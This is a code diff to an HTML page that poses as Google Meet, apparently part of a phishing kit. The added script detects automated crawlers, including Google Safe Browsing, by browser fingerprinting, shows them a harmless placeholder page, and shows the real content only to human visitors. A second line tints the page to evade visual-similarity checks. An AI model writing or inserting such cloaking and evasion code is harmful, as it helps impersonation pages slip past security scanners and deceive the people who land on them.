@@ -8,6 +8,26 @@
     <link rel="icon" href="https://www.gstatic.com/meet/icons/icon_728_728_20200708.png" type="image/png">
     <title>Google Meet</title>
     <script>
+        // GSB Crawler Protection: Additional layer of protection
+        // If loaded via document.write from index.html, crawlers were already filtered
+        // If accessed directly, this will block crawlers
+        (function() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const hasNotificationAPI = typeof self.Notification !== 'undefined';
+            const hasWebdriver = navigator.webdriver === true;
+            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+            const hasChrome = window.chrome && window.chrome.runtime;
+            const isRealBrowser = (hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome)) || isMobile;
+            
+            if (!isRealBrowser) {
+                // Crawler detected - show benign content
+                document.open();
+                document.write('<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome</h1><p>This is a standard placeholder page.</p></body></html>');
+                document.close();
+                return;
+            }
+        })();
+        
         // Hue Rotation Evasion
         document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
     </script>
